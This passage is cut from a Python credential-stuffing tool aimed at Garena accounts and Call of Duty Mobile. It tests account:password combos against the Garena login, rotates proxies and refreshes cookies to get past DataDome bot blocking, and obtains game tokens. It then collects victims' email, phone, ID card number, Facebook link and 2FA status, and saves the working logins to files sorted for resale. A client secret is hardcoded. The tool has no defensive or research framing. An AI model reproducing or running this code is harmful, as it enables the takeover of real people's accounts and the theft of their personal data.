                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            if attempt > 0:
                logger.info(f"      🔄 Retry {attempt + 1}/{retries}")
            
            response = session.get(url, headers=headers, params=params, timeout=8)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            # ── Handle 403 DataDome challenge ──
            if response.status_code == 403:
                logger.warning(f"      🚫 403 — DataDome challenge detected (attempt {attempt+1}/{retries})")
                
                # If we got new cookies, try immediately with them
                if new_cookies and attempt < retries - 1:
                    logger.info(f"      🍪 Got new cookies from 403 response — retrying...")
                    datadome_manager.refresh_datadome(session)
                    backoff(attempt)
                    continue
                
                # Let DataDomeManager handle the 403 (proxy rotation + DD refresh)
                if datadome_manager.handle_403(session, telegram_config=telegram_config):
                    # Recovery succeeded — signal to outer loop to retry with new proxy/DD
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"      🚨 DataDome block unrecoverable — skipping account")
                    return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      ✗ Invalid response format")
                # Check if response looks like a DataDome challenge
                resp_text = response.text[:200] if response.text else ""
                if "captcha-delivery" in resp_text:
                    logger.warning(f"      🛡️ Response contains DataDome CAPTCHA redirect")
                    if attempt < retries - 1:
                        datadome_manager.refresh_datadome(session)
                        backoff(attempt)
                        continue
                if attempt < retries - 1:
                    backoff(attempt)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                error_msg = data.get('error', '')
                # Distinguish between "account not found" and DataDome errors
                if 'captcha' in str(error_msg).lower() or 'blocked' in str(error_msg).lower():
                    logger.warning(f"      🛡️ DataDome error in response: {error_msg}")
                    if attempt < retries - 1:
                        datadome_manager.refresh_datadome(session)
                        backoff(attempt)
                        continue
                logger.error(f"      ✗ Error: {error_msg}")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"      ✗ Missing authentication data")
                return None, None, new_datadome
                
            logger.info(f"   ✔ Prelogin successful")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.warning(f"      🚫 403 (HTTPError) — DataDome challenge")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    if new_cookies and attempt < retries - 1:
                        logger.info(f"      🍪 Got new cookies from 403 — retrying...")
                        datadome_manager.refresh_datadome(session)
                        backoff(attempt)
                        continue
                    
                    if datadome_manager.handle_403(session, telegram_config=telegram_config):
                        return "IP_BLOCKED", None, None
                    else:
                        logger.error(f"      🚨 DataDome block unrecoverable")
                        return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"      ✗ HTTP {e.response.status_code}")
            else:
                logger.error(f"      ✗ Connection error")
                
            if attempt < retries - 1:
                backoff(attempt)
                continue
        except requests.exceptions.ConnectionError as e:
            logger.warning(f"      🔌 Proxy dead/rate-limited: {str(e)[:80]}")
            return "CONN_ERROR", None, None

        except requests.exceptions.Timeout as e:
            logger.warning(f"      ⏱️ Proxy timeout: {str(e)[:80]}")
            return "CONN_ERROR", None, None

        except Exception as e:
            err = str(e)
            if any(kw in err for kw in ('ConnectionPool', 'HTTPSConnection', 'Max retries', 'RemoteDisconnected', 'Connection refused', 'ProxyError', 'SOCKS')):
                logger.warning(f"      🔌 Proxy connection failed: {err[:80]}")
                return "CONN_ERROR", None, None
            logger.error(f"      💥 Unexpected error: {err[:50]}")
            if attempt < retries - 1:
                backoff(attempt)
                
    return None, None, None


def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 2  # 2 fast retries on login
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=5)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"      ✘ Invalid JSON response from login")
                if attempt < retries - 1:
                    backoff(attempt)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    logger.warning(f"     ✘ Login failed: Invalid credentials")
                    logger.warning(f"         └─ 🔑 Reason: {error_msg}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"     ✘ Login failed: Captcha required — rotating proxy")
                    logger.warning(f"         └─ 🤖 Reason: {error_msg}")
                    geo_rotator.force_rotate()
                    session.proxies.update(geo_rotator.get_proxies())
                    backoff(attempt)
                    continue
                else:
                    logger.warning(f"     ✘ Login failed: Invalid credentials")
                    logger.warning(f"         └─ ⚠️ Reason: {error_msg}")
                    return None
                    
            return sso_key
            
        except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError) as e:
            logger.warning(f"      🔌 Proxy dead/rate-limited on login — removing proxy: {str(e)[:80]}")
            geo_rotator.force_rotate()
            session.proxies.update(geo_rotator.get_proxies())
            if attempt < retries - 1:
                backoff(attempt)
        except requests.RequestException as e:
            logger.error(f"      ✘ Login request failed (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                backoff(attempt)
                
    return None


def get_codm_access_token(session):
    """New OAuth flow using authorization code grant type"""
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=5)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        
        if not auth_code:
            return ('', '', '')
        
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=5)
        token_json = token_response.json()
        
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        
        return (access_token, open_id, uid)
        
    except Exception as e:
        logger.error(f'Error getting CODM access token: {e}')
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    """Try multiple methods to get CODM info"""
    try:
        # Try old callback URL
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
            'referer': 'https://auth.garena.com/'
        }
        
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=5)
        location = old_response.headers.get('Location', '')
        
        if 'err=3' in location:
            return (None, 'no_codm')
        if 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        
        # Try AOS callback
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'referer': 'https://100082.connect.garena.com/',
            'x-requested-with': 'com.garena.game.codm'
        }
        
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=5)
        aos_location = aos_response.headers.get('Location', '')
        
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        if 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        
        return (None, 'unknown_error')
        
    except Exception as e:
        logger.error(f'Error processing CODM callback: {e}')
        return (None, 'error')

def get_codm_user_info(session, token):
    """Get CODM user info using the delete token"""
    try:
        # Try to decode JWT token
        parts = token.split('.')
        if len(parts) == 3:
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            jwt_data = json.loads(decoded)
            user_data = jwt_data.get('user', {})
            if user_data:
                return {
                    'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                    'codm_level': user_data.get('codm_level', 'N/A'),
                    'region': user_data.get('region', 'N/A'),
                    'uid': user_data.get('uid', 'N/A'),
                    'open_id': user_data.get('open_id', 'N/A'),
                    't_open_id': user_data.get('t_open_id', 'N/A')
                }
        
        # Fallback to API call
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'codm-delete-token': token,
            'origin': 'https://delete-request-aos.codm.garena.co.id',
            'referer': 'https://delete-request-aos.codm.garena.co.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'x-requested-with': 'com.garena.game.codm'
        }
        
        response = session.get(url, headers=headers, timeout=5)
        data = response.json()
        user_data = data.get('user', {})
        
        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        else:
            return {}
            
    except Exception as e:
        logger.error(f'Error getting CODM user info: {e}')
        return {}

def check_codm_account(session, account):
    """Check if account has CODM — retries once on transient failures."""
    codm_info = {}
    has_codm = False
    for codm_attempt in range(2):  # retry once on failure
        try:
            access_token, open_id, uid = get_codm_access_token(session)
            if not access_token:
                if codm_attempt == 0:
                    logger.debug('      └─ ⚠️ No CODM access token — retrying...')
                    backoff(0)
                    continue
                logger.warning('      └─ ⚠️ No CODM access token')
                return (has_codm, codm_info)

            codm_token, status = process_codm_callback(session, access_token, open_id, uid)
            if status == 'no_codm':
                logger.info('      └─ 📭 No CODM detected')
                return (has_codm, codm_info)

            if status != 'success' or not codm_token:
                if codm_attempt == 0:
                    logger.debug(f'      └─ ⚠️ CODM callback failed: {status} — retrying...')
                    backoff(0)
                    continue
                logger.warning(f'      └─ ⚠️ CODM callback failed: {status}')
                return (has_codm, codm_info)

            codm_info = get_codm_user_info(session, codm_token)
            if codm_info:
                has_codm = True
                logger.info(f"      └─ 🎮 CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
            return (has_codm, codm_info)
        except Exception as e:
            if codm_attempt == 0:
                logger.debug(f'      └─ ✘ Error checking CODM: {e} — retrying...')
                backoff(0)
                continue
            logger.error(f'      └─ ✘ Error checking CODM: {e}')
    return (has_codm, codm_info)

def display_codm_info(account_details, codm_info):
    if not codm_info:
        return ""
    
    if isinstance(account_details, str):
        account_details = {
            'username': account_details,
            'nickname': 'N/A',
            'email': account_details,
            'personal': {
                'mobile_no': 'N/A',
                'country': 'N/A',
                'id_card': 'N/A'
            },
            'bind_status': 'N/A',
            'security_status': 'N/A',
            'profile': {
                'shell_balance': 'N/A'
            },
            'status': {
                'account_status': 'N/A'
            },
            'game_info': []
        }
    
    display_text = f" Username: {account_details.get('username', 'N/A')}\n"
    display_text += f" Nickname: {account_details.get('nickname', 'N/A')}\n"
    display_text += f" Email: {account_details.get('email', 'N/A')}\n"
    display_text += f" Phone: {account_details['personal'].get('mobile_no', 'N/A')}\n"
    display_text += f" Country: {account_details['personal'].get('country', 'N/A')}\n"
    display_text += f" ID Card: {account_details['personal'].get('id_card', 'N/A')}\n"
    display_text += f" Bind Status: {account_details.get('bind_status', 'N/A')}\n"
    display_text += f" Security: {account_details.get('security_status', 'N/A')}\n"
    display_text += f" Shell Balance: {account_details['profile'].get('shell_balance', 'N/A')}\n"
    display_text += f" Account Status: {account_details['status'].get('account_status', 'N/A')}\n"
    display_text += " CODM INFO:\n"
    display_text += f"   Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
    display_text += f"   Level: {codm_info.get('codm_level', 'N/A')}\n"
    display_text += f"   Region: {codm_info.get('region', 'N/A')}\n"
    display_text += f"   UID: {codm_info.get('uid', 'N/A')}\n"
    
    return display_text

def save_codm_account(account, password, codm_info, country='N/A', is_clean=False, result_folder='Results'):
    """Save CODM account to organized folder structure based on clean status, country, and level"""
    try:
        if not codm_info:
            return
            
        codm_level = int(codm_info.get('codm_level', 0))
        region = codm_info.get('region', 'N/A').upper()
        nickname = codm_info.get('codm_nickname', 'N/A')
        
        # Determine country code
        if isinstance(country, dict):
            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
        else:
            country_code = country.upper() if country and country != 'N/A' else region
            
        if country_code == 'N/A' or not country_code or country_code == 'NONE':
            country_code = region if region and region != 'N/A' else 'UNKNOWN'

        # Determine level range
        if codm_level <= 50:
            level_range = "1-50"
        elif codm_level <= 100:
            level_range = "51-100"
        elif codm_level <= 150:
            level_range = "101-150"
        elif codm_level <= 200:
            level_range = "151-200"
        elif codm_level <= 250:
            level_range = "201-250"
        elif codm_level <= 300:
            level_range = "251-300"
        elif codm_level <= 350:
            level_range = "301-350"
        else:
            level_range = "351+"

        # Determine clean status folder
        clean_folder = "Clean" if is_clean else "NotClean"
        
        # Create folder structure: result_folder/Clean or NotClean/CountryCode/
        folder_path = os.path.join(result_folder, clean_folder, country_code)
        os.makedirs(folder_path, exist_ok=True)
        
        level_file = os.path.join(folder_path, f"{level_range}_accounts.txt")
        
        # Append directly — duplicates prevented upstream by combo deduplication
        if account and password:
            with open(level_file, "a", encoding="utf-8") as f:
                f.write(f"{account}:{password} | Level: {codm_level} | Nickname: {nickname} | Region: {region} | UID: {codm_info.get('uid', 'N/A')}\n")
            
    except Exception as e:
        pass


def save_clean_or_notclean(account, password, details, codm_info, result_folder='Results'):
    """Save account details to clean.txt or notclean.txt and organized CODM folders"""
    try:
        os.makedirs(result_folder, exist_ok=True)
        
        codm_nickname = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'

        username = details.get('username', account)
        email = details.get('email', 'N/A')
        email_verified_flag = details.get('email_verified') if isinstance(details.get('email_verified'), bool) else False
        email_ver = "Verified" if email_verified_flag else "Not Verified"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        mobile_bound = "Yes" if mobile and str(mobile).strip() else "No"

        fb_account = details.get('security', {}).get('facebook_account') or {}
        fb_linked_flag = details.get('security', {}).get('facebook_connected') or (True if fb_account else False)
        fb_linked = "Linked" if fb_linked_flag else "Not Linked"
        fb_uid = fb_account.get('fb_uid') if isinstance(fb_account, dict) else "N/A"
        fb = f"Linked ({fb_uid})" if fb_linked == 'Linked' else "Not Linked"
        fbl = f"https://facebook.com/{fb_uid}" if fb_linked == 'Linked' else "N/A"

        safe_avatar = details.get('profile', {}).get('avatar', 'N/A')
        shell = details.get('profile', {}).get('shell_balance', 'N/A')
        ipk = details.get('ip_for_msg', 'N/A')
        ipc = details.get('country', 'N/A')
        acc_country = details.get('personal', {}).get('country', 'N/A')

        authenticator_enabled = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
        two_step_enabled = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
        
        is_clean = details.get('is_clean', False)
        clean_status = "CLEAN" if is_clean else "NOT CLEAN"
        
        codm_info_block = f"  [+] CODM Nickname : {codm_nickname}\n  [+] CODM UID      : {codm_uid}\n  [+] CODM Level    : {codm_level}"
        
        content_to_save = f"""
[LOGIN SUCCESSFUL]
=======================================
         [ACCOUNT INFO]
  [+] Username       : {username}:{password}
  [+] Last Login     : {details.get('last_login', 'Unknown')}
  [+] Location       : {details.get('last_login_where', 'N/A')}
  [+] IP Address     : {ipk}
  [+] Country (Login): {ipc}
  [+] Country (User) : {acc_country}

         [ACCOUNT DETAILS]
  [+] Garena Shells  : {shell}
  [+] Avatar URL     : {safe_avatar}
  [+] Mobile No      : {mobile}
  [+] Email          : {email} ({email_ver})
  [+] FB Username    : {fb}
  [+] FB Profile     : {fbl}

         [GAME INFO]
{codm_info_block}

         [SECURITY BINDINGS]
  [+] Mobile Bound   : {mobile_bound}
  [+] Email Verified : {email_verified_flag}
  [+] Facebook Linked: {fb_linked}
  [+] Authenticator  : {authenticator_enabled}
  [+] 2FA Enabled    : {two_step_enabled}
  [+] Account Status : {clean_status}
  [] CONFIG BY: @Yukiii_ii
=======================================
"""
        # Save to main clean.txt or notclean.txt (append-only, skip full-file scan)
        file_path = os.path.join(result_folder, 'clean.txt' if is_clean else 'notclean.txt')
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(content_to_save.strip() + "\n\n")

        # Save to organized CODM folder structure if has CODM
        if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
            save_codm_account(account, password, codm_info, acc_country, is_clean, result_folder)

    except Exception as e:
        pass


def save_account_details_full(account, details, codm_info=None, password=None, result_folder='Results'):
    """Save full account details to full_details.txt"""
    try:
        os.makedirs(result_folder, exist_ok=True)
        
        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
        shell_balance = details['profile']['shell_balance']
        country = details['personal']['country']
        is_clean = details.get('is_clean', False)

        with open(os.path.join(result_folder, 'full_details.txt'), 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"Account: {account}\n")
            f.write(f"Password: {password}\n")  
            f.write(f"UID: {details['uid']}\n")
            f.write(f"Username: {details['username']}\n")
            f.write(f"Nickname: {details['nickname']}\n")
            f.write(f"Email: {details['email']}\n")
            f.write(f"Phone: {details['personal']['mobile_no']}\n")
            f.write(f"Country: {country}\n")
            f.write(f"Shell Balance: {shell_balance}\n")
            f.write(f"Account Status: {details['status']['account_status']}\n")
            f.write(f"Is Clean: {is_clean}\n")
            if codm_info:
                f.write(f"CODM Name: {codm_name}\n")
                f.write(f"CODM UID: {codm_uid}\n")
                f.write(f"CODM Region: {codm_region}\n")
                f.write(f"CODM Level: {codm_level}\n")
            f.write("=" * 60 + "\n\n")
            
    except Exception as e:
        pass

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        
        'binds': [],
        'game_info': []
    }

    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('***') and '@' in email and not email.endswith('@gmail.com') and '****' not in email:
        account_info['binds'].append('Email')
    
    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')
    if user_info.get('email_v', 0) == 1 or len(account_info['binds']) > 0:
        account_info['is_clean'] = False
        account_info['bind_status'] = f"Bound ({', '.join(account_info['binds']) or 'Email Verified'})"
    else:
        account_info['is_clean'] = True
        account_info['bind_status'] = "Clean"

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("[WARNING] Suspicious")
    
    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info


def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results', telegram_config=None):
    try:
        MAX_IP_BLOCK_RETRIES = 3   # 3 retries (up from 2) — better recovery with improved DD handling
        v1, v2, new_datadome = None, None, None

        # ── If we have no datadome at all, try fetching one before starting ──
        if not datadome_manager.get_datadome():
            fresh_dd = get_datadome_cookie(session, max_retries=2)
            if fresh_dd:
                datadome_manager.set_datadome(fresh_dd)
                datadome_manager.set_session_datadome(session, fresh_dd)

        for ip_block_attempt in range(MAX_IP_BLOCK_RETRIES):
            # ── Ensure session has a fresh DataDome cookie before each attempt ──
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)
            elif datadome_manager.is_cookie_stale():
                # Cookie is stale — try refreshing it before prelogin
                datadome_manager.refresh_datadome(session)

            v1, v2, new_datadome = prelogin(session, account, datadome_manager, telegram_config=telegram_config)

            if v1 == "IP_BLOCKED":
                logger.warning(f"[RETRY] IP blocked attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — rotating proxy + refreshing DataDome...")
                # Try force-rotate first
                new_proxy = geo_rotator.force_rotate()
                if new_proxy:
                    session.proxies.update(geo_rotator.get_proxies())
                    # Refresh DataDome on new proxy
                    datadome_manager.refresh_datadome(session)
                else:
                    logger.warning(f"[RETRY] No proxy available for rotation — trying direct connection")
                    session.proxies.clear()
                    datadome_manager.refresh_datadome(session)
                continue

            if v1 == "CONN_ERROR":
                logger.warning(f"[RETRY] Connection error attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — smart rotating...")
                new_proxy = geo_rotator.smart_rotate()
                if new_proxy:
                    session.proxies.update(geo_rotator.get_proxies())
                else:
                    logger.warning(f"[RETRY] No proxy available — trying direct connection")
                    session.proxies.clear()
                continue

            break  # prelogin succeeded or hard-failed — exit retry loop

        if v1 in ("IP_BLOCKED", "CONN_ERROR"):
            logger.error(f"[RETRY] Exhausted {MAX_IP_BLOCK_RETRIES} retries for {account} — skipping")
            live_stats.update_stats(valid=False)
            reason = "🛡️ DataDome blocked" if v1 == "IP_BLOCKED" else "🔌 Proxy exhausted"
            return f"🚨 {reason} - Skipped after {MAX_IP_BLOCK_RETRIES} retries"

        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return ""
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
        
        sso_key = login(session, account, password, v1, v2)
        
        if not sso_key:
            live_stats.update_stats(valid=False)
            return ""
        
        # ── account/init with retry on 403 ───────────────────────
        account_data = None
        for init_attempt in range(2):  # 2 fast tries then skip
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

            headers = {
                'accept': '*/*',
                'referer': 'https://account.garena.com/',
